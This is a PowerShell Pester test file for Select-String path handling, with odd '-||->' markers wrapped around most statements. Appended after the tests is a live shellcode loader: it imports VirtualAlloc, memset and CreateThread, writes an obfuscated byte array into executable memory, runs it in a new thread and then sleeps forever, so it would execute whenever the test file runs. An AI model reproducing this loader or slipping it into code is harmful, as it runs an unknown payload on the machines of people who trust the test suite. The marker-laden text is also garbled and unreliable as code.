

 -||-> Describe "String cmdlets" -Tags "CI" {
     -||-> Context "Select-String" {
         -||-> BeforeAll {
             -||-> $sep = [io.path]::DirectorySeparatorChar <-||- 
             -||-> $fileName =  -||-> New-Item 'TestDrive:\selectStr[ingLi]teralPath.txt' <-||-  <-||- 
             -||-> "abc" | Out-File -LiteralPath $fileName.fullname <-||- 
	         -||-> "bcd" | Out-File -LiteralPath $fileName.fullname -Append <-||- 
	         -||-> "cde" | Out-File -LiteralPath $fileName.fullname -Append <-||- 

             -||-> $fileNameWithDots = $fileName.FullName.Replace("\", "\.\") <-||- 

             -||-> $subDirName =  -||-> Join-Path $TestDrive 'selectSubDir' <-||-  <-||- 
             -||-> New-Item -Path $subDirName -ItemType Directory -Force > $null <-||- 
             -||-> $pathWithoutWildcard = $TestDrive <-||- 
             -||-> $pathWithWildcard =  -||-> Join-Path $TestDrive '*' <-||-  <-||- 

            
             -||-> $tempFile =  -||-> New-TemporaryFile | Get-Item <-||-  <-||- 
             -||-> "abc" | Out-File -LiteralPath $tempFile.fullname <-||- 
	         -||-> "bcd" | Out-File -LiteralPath $tempFile.fullname -Append <-||- 
	         -||-> "cde" | Out-File -LiteralPath $tempFile.fullname -Append <-||- 
             -||-> $driveLetter = $tempFile.PSDrive.Name <-||- 
             -||-> $fileNameAsNetworkPath = "\\localhost\$driveLetter`$" + $tempFile.FullName.SubString(2) <-||- 

	         -||-> Push-Location "$fileName\.." <-||- 
        } <-||- 

         -||-> AfterAll {
             -||-> Remove-Item $tempFile -Force -ErrorAction SilentlyContinue <-||- 
             -||-> Pop-Location <-||- 
        } <-||- 

         -||-> It "Select-String does not throw on subdirectory (path without wildcard)" {
             -||-> {  -||-> select-string -Path  $pathWithoutWildcard "noExists" -ErrorAction Stop <-||-  } | Should -Not -Throw <-||- 
        } <-||- 

         -||-> It "Select-String does not throw on subdirectory (path with wildcard)" {
             -||-> {  -||-> select-string -Path  $pathWithWildcard "noExists" -ErrorAction Stop <-||-  } | Should -Not -Throw <-||- 
        } <-||- 

         -||-> It "LiteralPath with relative path" {
             -||-> ( -||-> select-string -LiteralPath ( -||-> Get-Item -LiteralPath $fileName <-||- ).Name "b" <-||- ).count | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "LiteralPath with absolute path" {
             -||-> ( -||-> select-string -LiteralPath $fileName "b" <-||- ).count | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "LiteralPath with dots in path" {
             -||-> ( -||-> select-string -LiteralPath $fileNameWithDots "b" <-||- ).count | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "Network path" -skip:( -||-> !$IsWindows <-||- ) {
             -||-> ( -||-> select-string -LiteralPath $fileNameAsNetworkPath "b" <-||- ).count | Should -Be 2 <-||- 
        } <-||- 

         -||-> It "throws error for non filesystem providers" {
             -||-> $aaa = "aaaaaaaaaa" <-||- 
             -||-> select-string -literalPath variable:\aaa "a" -ErrorAction SilentlyContinue -ErrorVariable selectStringError <-||- 
             -||-> $selectStringError.FullyQualifiedErrorId | Should -Be 'ProcessingFile,Microsoft.PowerShell.Commands.SelectStringCommand' <-||- 
        } <-||- 

         -||-> It "throws parameter binding exception for invalid context" {
             -||-> {  -||-> select-string It $PSScriptRoot -Context -1,-1 <-||-  } | Should -Throw Context <-||- 
        } <-||- 

         -||-> It "match object supports RelativePath method" {
             -||-> $file = "Modules${sep}Microsoft.PowerShell.Utility${sep}Microsoft.PowerShell.Utility.psd1" <-||- 

             -||-> $match =  -||-> Select-String CmdletsToExport $pshome/$file <-||-  <-||- 

             -||-> $match.RelativePath($pshome) | Should -Be $file <-||- 
             -||-> $match.RelativePath($pshome.ToLower()) | Should -Be $file <-||- 
             -||-> $match.RelativePath($pshome.ToUpper()) | Should -Be $file <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $Rkdz = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $Rkdz -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0x58,0xea,0x88,0xb7,0xdb,0xc1,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x58,0x0f,0x03,0x58,0x57,0x08,0x7d,0x4b,0x8f,0x4e,0x7e,0xb4,0x4f,0x2f,0xf6,0x51,0x7e,0x6f,0x6c,0x11,0xd0,0x5f,0xe6,0x77,0xdc,0x14,0xaa,0x63,0x57,0x58,0x63,0x83,0xd0,0xd7,0x55,0xaa,0xe1,0x44,0xa5,0xad,0x61,0x97,0xfa,0x0d,0x58,0x58,0x0f,0x4f,0x9d,0x85,0xe2,0x1d,0x76,0xc1,0x51,0xb2,0xf3,0x9f,0x69,0x39,0x4f,0x31,0xea,0xde,0x07,0x30,0xdb,0x70,0x1c,0x6b,0xfb,0x73,0xf1,0x07,0xb2,0x6b,0x16,0x2d,0x0c,0x07,0xec,0xd9,0x8f,0xc1,0x3d,0x21,0x23,0x2c,0xf2,0xd0,0x3d,0x68,0x34,0x0b,0x48,0x80,0x47,0xb6,0x4b,0x57,0x3a,0x6c,0xd9,0x4c,0x9c,0xe7,0x79,0xa9,0x1d,0x2b,0x1f,0x3a,0x11,0x80,0x6b,0x64,0x35,0x17,0xbf,0x1e,0x41,0x9c,0x3e,0xf1,0xc0,0xe6,0x64,0xd5,0x89,0xbd,0x05,0x4c,0x77,0x13,0x39,0x8e,0xd8,0xcc,0x9f,0xc4,0xf4,0x19,0x92,0x86,0x90,0xee,0x9f,0x38,0x60,0x79,0x97,0x4b,0x52,0x26,0x03,0xc4,0xde,0xaf,0x8d,0x13,0x21,0x9a,0x6a,0x8b,0xdc,0x25,0x8b,0x85,0x1a,0x71,0xdb,0xbd,0x8b,0xfa,0xb0,0x3d,0x34,0x2f,0x2c,0x3b,0xa2,0x10,0x19,0xf1,0x29,0xf9,0x58,0xf6,0x4c,0x42,0xd5,0x10,0x1e,0xe4,0xb6,0x8c,0xde,0x54,0x77,0x7d,0xb6,0xbe,0x78,0xa2,0xa6,0xc0,0x52,0xcb,0x4c,0x2f,0x0b,0xa3,0xf8,0xd6,0x16,0x3f,0x99,0x17,0x8d,0x45,0x99,0x9c,0x22,0xb9,0x57,0x55,0x4e,0xa9,0x0f,0x95,0x05,0x93,0x99,0xaa,0xb3,0xbe,0x25,0x3f,0x38,0x69,0x72,0xd7,0x42,0x4c,0xb4,0x78,0xbc,0xbb,0xcf,0xb1,0x28,0x04,0xa7,0xbd,0xbc,0x84,0x37,0xe8,0xd6,0x84,0x5f,0x4c,0x83,0xd6,0x7a,0x93,0x1e,0x4b,0xd7,0x06,0xa1,0x3a,0x84,0x81,0xc9,0xc0,0xf3,0xe6,0x55,0x3a,0xd6,0xf6,0xaa,0xed,0x1e,0x8d,0xc2,0x2d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $kMLT=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $kMLT.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$kMLT,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



